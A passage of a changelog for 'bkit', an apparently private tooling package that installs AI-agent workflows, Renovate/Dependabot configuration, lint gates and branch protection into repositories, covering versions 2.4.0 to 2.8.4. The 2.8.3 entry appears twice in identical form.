- **bkit machinery consolidated under `.bkit/`; `.agents/` is now the cross-IDE agent runtime only (issues [#160](https://github.com/cbartens/bkit/issues/160), [#204](https://github.com/cbartens/bkit/issues/204)).** The install-engine source, templates, workflow/prompt mirror sources, and bkit-authoring docs moved under `.bkit/` (mirror sources read package-relative via `getPkgRoot`), and the version pin, `.env`/`.env.example`, `advisories.md`, `friction.md`, and `README.md` moved from `.agents/` to `.bkit/`, with `.bkit/docs/*` flattened to the `.bkit/` root. `.agents/` now holds runtime only (`rules.md`, `docs.md`, `skills/`, `skills.md`); `AGENTS.md` stays a router pointing at `.agents/rules.md`. **Consumer impact:** old-layout repos are migrated automatically on `bkit install`/`upgrade` — the payload pass moves version/`.env`/`.env.example`/friction content and drops the stale `advisories.md` artifact (verified content-preserving), so no manual action is required, but the on-disk layout of bkit-managed state changes. Package `files[]` excludes repo dogfood state (`.bkit/.env` etc.) so secrets never ship.

- **Workflows migrated to an inline tracker-marker model (issue [#202](https://github.com/cbartens/bkit/issues/202)).** `trackers.md` snippet-substitution is replaced by per-workflow `github`/`linear`/`true`/`false` markers resolved by `bkit-trackers.ts`: the renderer keeps the chosen tracker's body, drops the other, and collapses to a single generic skip stub under `none`. `trackers.md` is now reference-only (marker contract + per-tracker notes). Per-workflow leak-guards assert no tracker-only token survives a `none` render. Internal authoring change; no consumer-facing behaviour change.

- **pnpm 10.34.1 (issue [#212](https://github.com/cbartens/bkit/issues/212)).** Renovate dependency bump of the pinned package manager.

- **BREAKING — `scripts/ci/bkit-set-protection.sh` → `scripts/ci/bkit-protect-main.sh`, and the required status check flips `bkit-tests` → `bkit-tests-check`** (the always-on capstone is the SOLE branch-protection required check, so a required-check-green means "validated", not "the tests job did not fail"). The script's preflight now verifies a `bkit-tests-check` job exists before requiring it; single-job starter repos can set `REQUIRED_JOB=bkit-tests` until they adopt the capstone. `bkit-postinstall.ts`'s main-branch-protection quick-path advisory and `docs/pending.md` updated to the new name + check.

### Fixed

- **Friction backlog — six remediation waves (issue [#216](https://github.com/cbartens/bkit/issues/216)).** Wave 1: CI-integrity gates, control-flow, and actionlint fixes. Wave 2: switch-to-`dev` safety plus truncation detection. Waves 3 & 5: the pre-worktree `git add` is FID-scoped so a workflow never stages unrelated working-tree changes. Wave 4: plan scope-check rejects edits inside bkit-managed blocks. Wave 6: ship refreshes the PR head before squash-merge. A follow-up fixed `bkit-cloud.yml` SC2129 (shellcheck), and the HEAD-Subject Assertion now scans the full commit message at HEAD-clause sites so a `[skip ci]`/`[skip build]` token anywhere in the message is detected.

- **Completed the `ci.yml` Tier-2 → Tier-3 migration.** Static checks now run before the test/build group so the slop scan operates on a clean tree; decorative markers were dropped, `--ci` help fixed, the run-levels detector reworked, and the stale template-content snapshot plus `dist/` rebuilt to match.

---

## [2.8.4] — 2026-05-27

### Fixed

- **The Renovate private-registry `hostRules` token anchor was trapped in the canonical-overwrite `renovate.json5`, so a consumer's activation was reverted by bkit's canonical rewrite — silently breaking lockfile regen for all dependency PRs (issue [#199](https://github.com/cbartens/bkit/issues/199)).** `.github/renovate.json5` is Tier-1 canonical-overwrite, but the `token: "{{ secrets.GH_BKIT_TOKEN }}"` line consumers must uncomment for Renovate's hosted lockfile regen to authenticate to `npm.pkg.github.com` lived there — so bkit's canonical rewrite kept reverting it (the `bkit install` overwrite path strips it unconditionally; `bkit upgrade` now conflict-flags such drift instead of silently overwriting), after which `renovate/artifacts` failed, `pnpm-lock.yaml` went stale, and consumer CI failed `pnpm install --frozen-lockfile` (`ERR_PNPM_OUTDATED_LOCKFILE`) on every bumped package. Observed on a 2.8.3 consumer across three upgrade commits. Fixed by moving the `hostRules` anchor out of the canonical file and seeding it (token line commented) into the consumer-owned `.github/renovate-local.json5` — which bkit creates once and never overwrites — so activation survives every upgrade. Renovate merges `hostRules` across extended presets; verified live on a consumer (Mend job, Renovate 43.194.0) that a secret-bearing token in the `local>` preset is honored ("Adding token authentication for npm.pkg.github.com" → lockfile regen succeeded, no 401). The Phase B activation checklist, `docs/deployments.md` (§ Renovate read-auth + the `GH_BKIT_TOKEN` presence matrix), and the consumer-facing template docs now point activation at `renovate-local.json5`. Consumers re-run `pnpm bkit upgrade` to drop the dead anchor from `renovate.json5`; if you had already uncommented the token there, move it to `renovate-local.json5` (the stub now seeds the commented line for you on a fresh install).

---

## [2.8.3] — 2026-05-26

### Fixed

- **Shipped `renovate.json5` referenced the consumer-overrides preset without the `.json5` extension, disabling the entire Renovate config (regression in 2.7.0, issue [#179](https://github.com/cbartens/bkit/issues/179)).** The generated `extends` entry was `local>OWNER/REPO//.github/renovate-local` (extensionless), but `bkit install --renovate` seeds the overrides file as `.github/renovate-local.json5`. Per Renovate's preset resolution an extensionless local preset defaults to `.json`, so Renovate fetched the nonexistent `renovate-local.json`, 404'd, and aborted the run with a `config-validation` error — disabling the whole repo config and raising an "Action Required: Fix Renovate Configuration" issue. Affected 2.7.0–2.8.2; found on a consumer running 2.8.2 (Renovate 43.194.0, Mend hosted), and bkit's own dogfood repo was affected too. Fixed by adding the explicit `.json5` extension to the preset reference everywhere bkit emits it (canonical template, regenerated dogfood config, the `RENOVATE_LOCAL_STUB` comment, and the `docs/deployments.md` / `docs/knowledge.md` references). The `.json5` seed file is kept (its comments are load-bearing and Renovate parses JSONC presets fine with the explicit extension); renaming the file to `.json` was rejected because bkit never overwrites the already-seeded `renovate-local.json5`, so it would re-break every existing consumer. Consumers re-run `pnpm bkit upgrade` to reconverge `renovate.json5` with zero drift (the `.json5` seed is already present and untouched). Tests now assert the `.json5` extension and that no extensionless reference survives.

### Removed

- **Removed the orphaned `lint:no-tier-terms` script.** The Phase-3 regression guard (`.agents/scripts/bkit-lint-no-tier-terms.ts` + its `package.json` script) was not wired into CI or any git hook, so it enforced nothing while still failing on pre-existing doc terminology. Dropped entirely.

---

## [2.8.3] — 2026-05-26

### Fixed

- **Shipped `renovate.json5` referenced the consumer-overrides preset without the `.json5` extension, disabling the entire Renovate config (regression in 2.7.0, issue [#179](https://github.com/cbartens/bkit/issues/179)).** The generated `extends` entry was `local>OWNER/REPO//.github/renovate-local` (extensionless), but `bkit install --renovate` seeds the overrides file as `.github/renovate-local.json5`. Per Renovate's preset resolution an extensionless local preset defaults to `.json`, so Renovate fetched the nonexistent `renovate-local.json`, 404'd, and aborted the run with a `config-validation` error — disabling the whole repo config and raising an "Action Required: Fix Renovate Configuration" issue. Affected 2.7.0–2.8.2; found on a consumer running 2.8.2 (Renovate 43.194.0, Mend hosted), and bkit's own dogfood repo was affected too. Fixed by adding the explicit `.json5` extension to the preset reference everywhere bkit emits it (canonical template, regenerated dogfood config, the `RENOVATE_LOCAL_STUB` comment, and the `docs/deployments.md` / `docs/knowledge.md` references). The `.json5` seed file is kept (its comments are load-bearing and Renovate parses JSONC presets fine with the explicit extension); renaming the file to `.json` was rejected because bkit never overwrites the already-seeded `renovate-local.json5`, so it would re-break every existing consumer. Consumers re-run `pnpm bkit upgrade` to reconverge `renovate.json5` with zero drift (the `.json5` seed is already present and untouched). Tests now assert the `.json5` extension and that no extensionless reference survives.

### Removed

- **Removed the orphaned `lint:no-tier-terms` script.** The Phase-3 regression guard (`.agents/scripts/bkit-lint-no-tier-terms.ts` + its `package.json` script) was not wired into CI or any git hook, so it enforced nothing while still failing on pre-existing doc terminology. Dropped entirely.

---

## [2.8.2] — 2026-05-26

### Fixed

- **Generated `.agents/advisories.md` failed consumer `lint:prose` in pre-commit/pre-push hooks, blocking the upgrade commit (follow-up to [#195](https://github.com/cbartens/bkit/issues/195)).** The advisories generator reproduces the `.vale.ini` reference verbatim — including the `write-good.So = NO` line added in 2.8.1 — and the write-good `StartsWith` rule matches the substring `good.So ` inside that config line, causing Vale to flag it. The file is gitignored so CI was unaffected, but consumer pre-commit/pre-push hooks operate on the on-disk file and would fail. Fixed by prepending a `<!-- vale off -->` whole-file skip marker to the generated `.agents/advisories.md`. This is a deliberate per-file opt-out for a generated artifact that reproduces config and slop tokens verbatim — not a blanket skip of gitignored files. Because the file regenerates on every `bkit install`/`upgrade`/`check`, the fix reaches all consumers (new and existing) on the next bkit run, unlike a `.vale.ini` exemption or `lint:prose` glob change.

---

## [2.8.1] — 2026-05-26

### Fixed

- **2.8.0 shipped prose that failed bkit's own Vale write-good gate, blocking consumer upgrade commits (issue [#195](https://github.com/cbartens/bkit/issues/195)).** `docs/deployments.md` contained a sentence-initial "So" — a pattern flagged by the write-good `StartsWith` rule that bkit ships and consumers run on every commit/push. The root cause was a lint asymmetry: bkit's own `lint:prose` script covered only `docs/knowledge.md`, not the full `docs/*.md` corpus, so the prose bkit was authoring and shipping was never linted by the same gate bkit imposes on consumers. Fixed by rewording the offending sentence ("So" → "This means") in both `docs/deployments.md` and its shipped template source, and widening `lint:prose` in bkit's own `package.json` to cover `docs/*.md` and `.agents/templates/docs/**` (parity with the consumer gate). Consumers re-run `pnpm bkit upgrade` to reconverge `docs/deployments.md` with zero drift (verified live).
- **bkit's own `lint:prose` did not cover the shipped template docs (issue [#195](https://github.com/cbartens/bkit/issues/195)).** `.agents/templates/docs/**` was absent from the Vale glob, meaning prose regressions in template sources were invisible until a consumer installed them. The template docs are now included in bkit's lint pass. KN-29 records the lint-asymmetry root cause and Vale `gether` config learnings for future reference.
- **Shipped `.vale.ini` lacked write-good exemptions for `docs/plans/**`and`docs/notes.md`(issue [#195](https://github.com/cbartens/bkit/issues/195)).** LLM-generated plan documents and notes routinely contain phrasing that triggers write-good/LLMSlop rules. Without exemptions, consumers running`pnpm lint:prose`on a repo with bkit-generated plan docs would get false-positive failures. The shipped`.vale.ini`template (a`seedOrPrint`file — reaches new consumers on seed; existing consumers merge manually) now excludes`docs/plans/\*\*`and`docs/notes.md` from the write-good and LLMSlop style checks.

---

## [2.8.0] — 2026-05-26

### Added

- **`@claude` mention launch path (path E) for cloud agents.** The `bkit-cloud` workflow now supports triggering a Claude Code cloud agent via an `@claude` mention in a GitHub issue comment — path E alongside the existing CI-triggered (path C) and `workflow_dispatch` (path D) entry points. Consumers with `--cloud` installed get the mention-triggered path automatically after upgrading.
- **Consumer-extensible Renovate config via `renovate-local.json5` (issue [#179](https://github.com/cbartens/bkit/issues/179)).** The shipped `renovate.json5` now `extends` a consumer-owned `.github/renovate-local.json5` which is seeded once and never overwritten. Allows consumers to add package-specific rules (e.g. `enabled: false` to fence a pinned package) that survive `bkit upgrade`. See the 2.7.0 entry for the full design; this entry credits the cloud wiring that depended on it.

### Changed

- **Renovate `bkit-cloud.yml` fenced via `ignorePaths` (follow-up to issue [#169](https://github.com/cbartens/bkit/issues/169)).** `bkit-cloud.yml` is now in `ignorePaths` in the shipped `renovate.json5`, stopping the file scan outright (the prior `matchFileNames` packageRule only suppressed version updates, not `pinDigests` rescans — causing recurring Pin PRs). `useBaseBranchConfig: "merge"` added so `renovate.json5` edits committed to `dev` are honored for dev-targeted runs.
- **Vite and pnpm major bumps fenced in the bkit dogfood `renovate-local.json5`.** These high-disruption majors now require manual review and are not auto-merged. Consumers running `bkit install --renovate` get the seeded `renovate-local.json5` as a template; applying similar guards is documented in `docs/deployments.md`.

---

## [2.7.0] — 2026-05-25

### Added

- **Consumer-extensible Renovate config — repo-specific rules now survive `bkit install`/`bkit upgrade` (issue [#179](https://github.com/cbartens/bkit/issues/179)).** The shipped `renovate.json5` (bkit-owned, rewritten on every `bkit install` — hand-edits are clobbered) now `extends` a consumer-owned `.github/renovate-local.json5`, seeded once by `bkit install --renovate` and never overwritten or diffed thereafter (it is not a managed template, so neither install nor upgrade touches it). A new `{{REPO_SLUG}}` token (parsed from the `origin` remote — HTTPS/SSH/scp forms) renders the `local>OWNER/REPO//.github/renovate-local` preset reference Renovate's local-preset syntax requires. Precedence is documented honestly: extended-preset packageRules are evaluated _before_ bkit's inline rules, so `renovate-local.json5` can add rules and set keys bkit leaves unset (notably `enabled: false` to fence a package — bkit never sets `enabled: true`) but cannot override a key bkit sets explicitly (e.g. `automerge`). The canonical use case — fencing a package pinned in root `pnpm.overrides` so Renovate's hosted lockfile regen can't rewrite the locked version and desync `pnpm-lock.yaml` (failing CI's `--frozen-lockfile`) — is captured in `docs/knowledge.md` KN-CORE-6.

### Changed

- **Recurring `chore(deps): Pin dependencies` PR on `bkit-cloud.yml` stopped (issue [#169](https://github.com/cbartens/bkit/issues/169) follow-up; KN-CORE-5).** `enabled: false` only suppresses _version_ updates — the `github-actions` manager still scanned `bkit-cloud.yml` and applied tag→SHA `pinDigests`, recreating the Pin PR on every scan. The file is now in `ignorePaths` (stops the scan outright); the `matchFileNames` packageRule is kept as a secondary guard. Paired with `useBaseBranchConfig: "merge"` so ongoing `renovate.json5` edits committed to `dev` are honored for dev-targeted runs (previously only the default branch's config was read).
- **Renovate / supply-chain operational docs relocated to `deployments.md` § GitHub Actions pinning (issue [#179](https://github.com/cbartens/bkit/issues/179)).** Action SHA-pinning, Renovate activation (Phase A/B), private-registry read-auth, consumer customization, the Dependabot alternative, and manual CVE handling are CI/CD pipeline rules — they now live under one canonical home in `deployments.md` instead of being split across `security.md`. `security.md` § Supply-Chain keeps only the security-relevant invariant (Renovate PRs run with a restricted `GITHUB_TOKEN` and no access to the agent API-key secrets). All cross-references (knowledge entries, install/postinstall advisories, README, config-template comments) updated.

---

## [2.6.1] — 2026-05-25

### Fixed

- **Renovate can now regenerate `pnpm-lock.yaml` for repos depending on the private `@cbartens/bkit` package (issue [#169](https://github.com/cbartens/bkit/issues/169)).** Resolving the workspace to regenerate the lockfile for _any_ dependency bump requires read auth to `npm.pkg.github.com`, which Mend's hosted runner lacks — so every consumer dependency PR was failing CI with `ERR_PNPM_OUTDATED_LOCKFILE`. The shipped `renovate.json5` template now carries an inert, tokenless `hostRules` anchor for `npm.pkg.github.com` (an active `{{ secrets.* }}` ref would hard-error when the Mend secret is unset, regressing consumers on upgrade), the Phase B activation advisory gains the read-auth provisioning step, and `docs/security.md` documents both the Mend-hosted (dashboard secret) and self-hosted (`RENOVATE_HOST_RULES` / `encrypted`) paths.

---

## [2.6.0] — 2026-05-25

### Added

- **GitHub Projects v2 board status lifecycle wired into every workflow (issue [#137](https://github.com/cbartens/bkit/issues/137)).** A new `issue-update-status` tracker snippet moves the Projects v2 board status across the full phase lifecycle — Step 1 of design/plan/build/debug/ship → _In progress_, each phase Close → _In review_, ship Close → _Done_ — mirroring the Linear state model. Driven by `package.json` `bkit.githubProject` (`owner`/`number`/`statusFieldId`/`progressOptionId`/`reviewOptionId`/`doneOptionId`) and skipped entirely when that config is absent. Requires the GitHub MCP `projects` toolset: the shipped `.mcp.json` templates now send the `X-MCP-Toolsets` header to enable it, and `docs/knowledge.md` gains entries for the common GitHub-MCP / pnpm install pitfalls. Status/state folds into existing per-step gate lines (no standalone gates) and tracker-snippet names stay out of orchestrator-facing prose.

### Changed

- **Cloud-agent integration is now fully opt-in — `--full` ships zero cloud footprint (issue [#119](https://github.com/cbartens/bkit/issues/119)).** The entire cloud surface moved into the opt-in `bkit install --cloud` module: the phase-routed workflow plus the env scaffolding (`.claude/hooks/cloud-bootstrap.sh`, `.cursor/Dockerfile`, `.cursor/environment.json`) that previously rode in the default `claude`/`cursor` modules. A default install no longer writes any file that auto-spins-up or bootstraps a Claude/Cursor cloud agent. The `.claude/settings.json` `SessionStart` hook entry for `cloud-bootstrap.sh` is now guarded (`test -f … || true`) so a `--full` install without the script no-ops instead of erroring. `bkit uninstall --full` still removes the opt-in add-ons (asymmetry preserved from [#129](https://github.com/cbartens/bkit/issues/129)); `bkit uninstall --cloud` targets only the cloud module.
- **Phase 1 — `bkit-ci-router` generalised into a phase-routed `bkit-cloud` workflow (issue [#119](https://github.com/cbartens/bkit/issues/119)).** `.github/workflows/bkit-ci-router.yml` → `.github/workflows/bkit-cloud.yml`: a single phase-agnostic GitHub Action that runs any bkit phase. CI-pass→`ship` / CI-fail→`debug` triggers are preserved exactly; `design`/`plan`/`build` are reachable via `workflow_dispatch` for end-to-end smoke testing. Dynamic `run-name` reflects phase + issue ref; concurrency is keyed on the issue (dispatch) or feat branch (CI). The mirrored orchestrator `/bkit-ci-router` → `/bkit-cloud` now routes by phase to the matching skill (the dispatched skill ingests its own brief from the tracker, MCP-only). The Renovate fence (`renovate.json5` `matchFileNames`) tracks the rename. Phase 2 (tracker webhook triggers) remains a follow-up.
- **`bkit-cloud.yml` no longer hardcodes Linear — `issueTracker: github` produces a Linear-free workflow (issue [#138](https://github.com/cbartens/bkit/issues/138)).** `bkit install`/`upgrade` now renders the cloud workflow for the consumer's `bkit.issueTracker`: github/none repos get a workflow with no `LINEAR_API_KEY` secret and `mcp__github__*` (not `mcp__linear__*`) in `--allowed-tools`; Linear repos are unchanged. The drift gate stays consistent because the render is deterministic from `issueTracker` (read identically on install and `bkit check`). The Linear-only advisories are now tracker-gated: `linear-api-key-secret-missing` and the `LINEAR_API_KEY` line in `cloud-secrets-three-locations` / `cloud-router` fire only under the Linear tracker — a migrated github repo's `bkit check` no longer nags for a key its workflow doesn't use. The `mcp-env` dotenv/direnv advisory prose (`mcp-env-missing-dotenv`, `mcp-env-blank-key-*`, `mcp-env-direnv-*`) is likewise tracker-gated — github/none repos are no longer told to set `LINEAR_API_KEY` in `.agents/.env`. (The shipped `.agents/.env.example` stays a complete reference listing every token.)
- **Server-side branch protection replaces the pre-commit wrong-branch guard (issue [#140](https://github.com/cbartens/bkit/issues/140)).** The `wrong-branch-guard` pre-commit stub and its advisory are removed — it contradicted ship's own dev commits and keyed off `$PWD` (which git forces to the repo root). Protection is now enforced server-side: `main` is PR-only with required check `bkit-tests`, `enforce_admins: true` (agents act with the owner's admin token, so admin bypass would void protection), linear history, and no force-push; `dev` is intentionally left open (operators choose direct-push or feat/PR). The CI job `run-tests` is renamed `bkit-tests` to fence it inside bkit's footprint (own + template `ci.yml`, fixtures, ship/workflows check-context refs). `bkit-set-protection.sh` now requires `bkit-tests`, sets `enforce_admins: true`, pre-flights that a `bkit-tests` job exists before requiring it, and drops `--dev`. (Live `main` protection on bkit's own private repo is deferred — 403 on non-Pro — tracked in `pending.md`.)
- **Cloud-agent docs corrected to the real support model (issue [#141](https://github.com/cbartens/bkit/issues/141), PR [#142](https://github.com/cbartens/bkit/pull/142)).** `cloud.md` previously presented Claude and Cursor cloud agents as symmetric across trackers and described the Claude `bkit-cloud` path as Linear-driven. It now leads with a support matrix — Claude ↔ GitHub, Cursor ↔ Linear, overlapping only on GitHub CI/PR events — and documents the manual `workflow_dispatch` entry point (phase + issue) for design/plan/build that Phase 1 shipped undocumented. The post-CI auto-routing Claude path is flipped from Linear to GitHub (`bkit:auto` label, `ANTHROPIC_API_KEY` only, `github.token` for labels/comments). Notes that Linear's bare `Auto` label is migrating to `bkit:auto`.

### Fixed

- **Fresh consumer installs crashed with `ERR_MODULE_NOT_FOUND: picomatch`.** `picomatch` is imported at runtime (`bkit-bkitignore.ts`, reached via `bkit-postinstall.ts`) but was declared in `devDependencies`, so `pnpm add @cbartens/bkit` — which installs only `dependencies` — never fetched it, and the CLI threw at module-load before doing any work. (Latent since 2.5.3; masked because every in-repo run has `picomatch` installed as a devDep.) Moved `picomatch` to `dependencies`; `@types/picomatch` stays in `devDependencies`. Verified end-to-end against a packed tarball in a throwaway consumer repo (`pnpm add` → `bkit install`/`check`/`upgrade`/`uninstall` all clean).
- **Workflow lock snippets derived the wrong `YYYYMM` bucket.** The Step 1 lock-acquisition snippet in build/cloud/debug/plan/ship read the month bucket from a trailing-slash glob (`ls -d …/logs/{FID}/`), so `awk -F/` emitted an empty final field and `$(NF-2)` extracted `logs` instead of the `YYYYMM` bucket — producing a bogus `docs/plans/logs/logs/{FID}/` lock + logs tree (the `[ -z "$YYYYMM" ]` guard passed because `logs` is non-empty). Fixed to `$(NF-3)` across all five workflows; the `$(NF-1)` FID-hint lines rely on the same empty final field and were already correct. A behavioural regression test extracts the real command from each workflow and runs it against a fabricated plan tree.

---

## [2.5.3] — 2026-05-24

### Fixed

- **Renovate dashboard noise from bkit's own footprint in consumer repos (issue [#132](https://github.com/cbartens/bkit/issues/132)).** The shipped `renovate.json5` now fences Renovate off the bkit files that land in a consumer working tree: `ignorePaths` adds `.agents/templates/**` and `.agents/skills/**` (bkit-owned mirrors written by `bkit install`/`upgrade`), and a packageRule disables the `@cbartens/bkit` package itself. Without these, consumer Renovate enumerated the mirrored template workflows / Cursor Dockerfile / vendored skill manifests on every scan (recurring onboarding-PR noise — `github-actions` and `dockerfile` managers match on path substrings, so the leaked template copy of `bkit-ci-router.yml` slipped past the existing file-name exemption too), and logged `Failed to look up npm package @cbartens/bkit: no-result` (the package is restricted on GitHub Packages, unauthable from Mend's hosted runner). bkit is bumped via `pnpm bkit upgrade`, never a bare Renovate version bump. The bkit repo dogfoods the same config — its real CI workflows stay Renovate-covered; only the template seeds are exempt. Mirrors the existing `bkit-ci-router.yml` exemption.

---

## [2.5.2] — 2026-05-23

### Fixed

- **`bkit upgrade` overwrote seed-or-print (Tier 3) files, dropping consumer content (issue [#129](https://github.com/cbartens/bkit/issues/129) follow-up).** Byte-equal files that install seeds once and never overwrites (`.husky/pre-commit`, `.husky/pre-push`, `.github/workflows/ci.yml`, `.vale.ini`, `slop-scan.config.json`, `.mcp.json`, `.cursor/{settings,environment,mcp}.json`, `.envrc`, `.agents/.env.example`) were whole-file-overwritten by upgrade when on-disk content matched the recorded canonical hash — which it does once a consumer's customisation has become the baseline at a prior install. A `.husky/pre-commit` carrying consumer steps (`pnpm lint-staged`, `pnpm run test:placeholders`) was replaced by the bkit stub. Manifest entries now carry a `seedOrPrint` flag; `bkit upgrade` refuses to overwrite a present seed-or-print file and surfaces a conflict instead — mirroring install's `writeTier3`. Canonical byte-equal files (`bkit-ci-router.yml`, `renovate.json5`, `dependabot.yml`) still auto-update.
- **`bkit upgrade` wrote the literal `{{DEFAULT_BRANCH}}` token into seeded files.** Upgrade wrote raw template content, so a freshly-seeded `.husky/pre-commit` (or `ci.yml`) shipped the unsubstituted token — the `wrong-branch-guard` case arm `dev|{{DEFAULT_BRANCH}}` would never match the real default branch. Upgrade now applies token substitution before diff + write, matching install's `writeTier1`/`writeTier3`. (Install was already correct.)
- **`bkit upgrade` left `pinnedVersion` stale, failing the next `bkit check`.** A clean upgrade refreshed `canonicalHashes` but never bumped `.agents/.bkit-version` `pinnedVersion`, so the immediately-following `bkit check` wanted to write the pin (1 write → exit 1) — leaving the repo CI-FAILING until a manual edit. `bkit upgrade` now bumps the pin to the upgraded-to version as part of a successful run, even when every file was a no-op skip.

---

## [2.5.1] — 2026-05-23

### Fixed

- **`bkit upgrade` no longer destroys consumer content (issue [#129](https://github.com/cbartens/bkit/issues/129)).** The upgrade engine whole-file-overwrote every template; on a file the consumer had not hand-edited it replaced the entire file with just the bkit block, eating content OUTSIDE the markers (`.gitignore` secret-protection rules, `.husky/pre-commit` steps, `.prettierignore` entries) and consumer-owned JSON keys (`.claude/settings.json` `mcpServers`). Upgrade now uses the SAME tier-aware writers as install: markered-text → managed-block merge (preserves everything outside `bkit:start`/`bkit:end`), JSON → deep-merge (preserves consumer keys). `docs/*.md` and `.agents/*.md` (markered markdown with no manifest entry) are protected via content-detected block-merge; canonical byte-equal files (`.vale.ini`, `ci.yml`) stay whole-file with drift-detection so install and upgrade never fight.
- **`.gitattributes` shipped without its leading dot (#129 §3).** 2.5.0 wrote the union-merge ledger rules to a file literally named `gitattributes`, which git never reads, and recorded a bogus dot-less `canonicalHashes` key. The template is renamed to `.gitattributes` (npm only strips `.gitignore`/`.npmignore`, not `.gitattributes`), it is now a managed core file written by `bkit install`, and `bkit upgrade` migrates a stray dot-less `gitattributes` → `.gitattributes` and drops the bad hash key.
- **`bkit upgrade` force-created opt-in module files (#129 §5).** The upgrade walk wrote every template, so it created `.github/renovate.json5` on consumers that never opted in — duplicate dependency PRs alongside existing Dependabot. Upgrade now skips creating opt-in-module files (renovate, dependabot) unless the consumer already has them (it still updates an opted-in file).
- **Stray trailing whitespace in the `.claude/settings.json` permissions template (#129 §2).**

### Changed

- **Single dotfile-remap mechanism.** The three divergent template-name remaps (module install pass, upgrade walk, dead `runTemplates`) collapse to one shared `remapTemplateDest()` covering only the names npm strips (`.gitignore`, `.npmignore`). Dead `runTemplates` removed; its tests repointed at the live mechanism.
- **`bkit uninstall --full` now removes opt-in add-ons.** Opt-in modules (renovate, dependabot) are asymmetric: `install --full` excludes them (they require explicit setup), but `uninstall --full` removes ALL of them so no bkit footprint remains. Target one with its flag (e.g. `uninstall --renovate`). Safe — uninstall is manifest-driven and skips files that were never installed.
- **`utility-new-release` preconditions tightened** — release gate now runs `check:dist` (no unbuilt `dist/`) + `bkit check` (no drift), and requires the `## [VERSION]` CHANGELOG block to carry actual notes.

### Migration

- After upgrading, if a stray dot-less `gitattributes` file exists at your repo root (created by 2.5.0), `bkit upgrade` renames it to `.gitattributes` automatically. Verify `.gitattributes` is committed so the append-only ledger union-merge rules take effect.

---

## [2.5.0] — 2026-05-23

### Changed

- **Renovate is now opt-in via `bkit install --renovate` (was shipped by `--full` in 2.4.0). (follow-up to issue [#123](https://github.com/cbartens/bkit/issues/123))** The Renovate App's first scan reads the default branch, so installing the App before `.github/renovate.json5` reaches `main` produces a broken onboarding PR (wrong base branch, ungrouped, redundant root `renovate.json`). `bkit install` cannot sequence the merge to `main`, so Renovate ships as a phase-gated opt-in module excluded from `--full`:
  - **Phase A** (config not yet on `origin/<default-branch>`): writes `.github/renovate.json5`, prompts the consumer to commit + PR + merge to the default branch, withholds the App-install URL.
  - **Phase B** (config detected on default branch): re-writes idempotently and prints the App-install URL + activation checklist.
- **Tracker setup advisory is now silenceable.** Explicit `bkit.issueTracker: "none"` suppresses the `tracker-setup-none` nudge (was: always fired on none/absent). Absent field still nudges.

### Added

- **`bkit install --dependabot` — Dependabot as an opt-in alternative to Renovate (mutually exclusive).** First-party GitHub feature; no App install, no phase gate, no third-party trust surface. Ships `.github/dependabot.yml` (github-actions ecosystem) + `scripts/ci/bkit-set-dependabot.sh` (repo-level state helper: auto-fixes-enabled, vulnerability-alerts, never-auto-merge-on-main). Mutual exclusion enforced at the CLI (`--renovate --dependabot` rejected) and per-module (each refuses if the other's config is present, with a cleanup advisory).
- **`bkit.depUpdater` package.json field** (`renovate` | `dependabot` | `none`) — records the dependency-updater choice, mirroring `bkit.issueTracker`. Set by the owning module on the success path. An explicit `none` silences the post-install nudge.
- **`dep-updater-setup-*` post-install advisory** (parity with `tracker-setup-*`): nudges undecided consumers to pick `--renovate` or `--dependabot`; informational when either is active; quiet on explicit opt-out.
- **"Optional post-install decisions" documentation** (`README.md` + `.agents/README.md`): documents the two opt-in add-ons (issue tracker, dependency updater), why neither ships with `--full`, and the decide/silence flow.

### Removed

- **`detectRenovateConfigMissing` / `detectOrphanedDependabotConfig` detectors** — Renovate/Dependabot are both opt-in now, so neither absence is an error. The mutual-exclusion blocker handles the conflict case (both configs present).
- **bkit-repo dogfood configs removed then re-adopted via the opt-in flow** — `.github/renovate.json5` re-added through `bkit install --renovate`; the orphaned `scripts/ci/bkit-set-dependabot.sh` (missed by the 2.4.0 migration) deleted.

## [2.4.0] — 2026-05-23

### Changed

- **Replace Dependabot with Renovate as the canonical dependency-update tool. (issue [#123](https://github.com/cbartens/bkit/issues/123))** bkit now ships `.github/renovate.json5` as a canonical (auto-overwrite) config in place of the prior `.github/dependabot.yml` (seed-or-print). Single canonical config encodes `baseBranches: ["dev"]`, weekly grouped non-major bumps, `lockFileMaintenance`, `automerge` for devDependencies + patches, `osvVulnerabilityAlerts` for CVE-driven PRs, and `pinDigests: true` for the `github-actions` manager. A `packageRule` with `matchFileNames: [".github/workflows/bkit-ci-router.yml"]` + `enabled: false` keeps consumer-side Renovate out of bkit-managed workflow files entirely — new SHAs/versions arrive via `bkit install` when consumers bump the bkit package, not via consumer Renovate.

### Removed

- **`.agents/templates/.github/dependabot.yml`** — replaced by `renovate.json5` above.
- **`.agents/templates/scripts/ci/bkit-set-dependabot.sh`** — the GitHub repo-prereq helper. Renovate has no equivalent repo-level toggle; the Renovate App install is one-click via https://github.com/apps/renovate.
- **`DEPENDABOT_YML_MERGE_INSTRUCTIONS`** advisory string (the AI merge instruction for the old seed-or-print Tier 3 flow). Renovate ships as canonical-overwrite, so no merge advisory exists.
- **Four GH-API-based Dependabot detectors:** `detectDependabotTargetBranchMissing`, `detectDependabotConfigInvalid`, `detectDependabotRepoPrereqs`, `detectDependabotAutoFixesEnabled`. Renovate's config-shape and repo-prereq surfaces are simpler — these detectors are no longer load-bearing.

### Added

- **`detectRenovateConfigMissing`** — replaces `detectDependabotConfigMissing`. Emits one of two advisory IDs:
  - `renovate-config-missing` — `.github/workflows/` exists but no `.github/renovate.json5` (or `renovate.json`). Recovery: run `pnpm bkit install --ci` and install the Renovate App.
  - `renovate-config-missing-dependabot-orphan` — stale `.github/dependabot.yml` is still present and no Renovate config yet. Emits a 5-step cleanup script for consumers mid-migration (delete orphan, close open Dependabot PRs, disable Dependabot version updates in GitHub UI, install Renovate App, verify onboarding PR targets `dev`).

### Migration

- **bkit's own `.github/dependabot.yml` deleted; `.github/renovate.json5` added** as a byte-equal copy of the template (dogfood + manifest assertion).
- **Per-consumer cleanup prompt** published in issue [#123](https://github.com/cbartens/bkit/issues/123) body. Paste into a Claude session inside each bkit-consumer repo after upgrading bkit to >=2.4.0. Steps: `git rm .github/dependabot.yml` + `git rm scripts/ci/bkit-set-dependabot.sh`; close open Dependabot PRs; disable Dependabot version updates in repo Settings (leave alerts on — Renovate uses them via `osvVulnerabilityAlerts`); install the Renovate App; verify onboarding PR targets `dev`.
